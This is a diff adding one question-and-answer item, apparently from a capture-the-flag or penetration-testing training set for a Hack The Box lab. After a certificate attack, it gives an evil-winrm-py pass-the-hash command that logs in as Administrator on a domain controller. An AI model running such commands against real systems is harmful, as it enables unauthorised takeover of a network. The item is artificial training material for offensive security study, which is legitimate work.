@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What should you do after obtaining a TGT and NTLM hash as an administrator?
+
+CONTEXT:
+You have successfully performed the certificate attack.
+
+METHOD / ANSWER:
+Command: `evil-winrm-py -i dc01.fluffy.htb -u administrator -H <admin_hash>`
+Explanation: Use Evil-WinRM to authenticate as the Administrator using the obtained hash, allowing full access to the system.
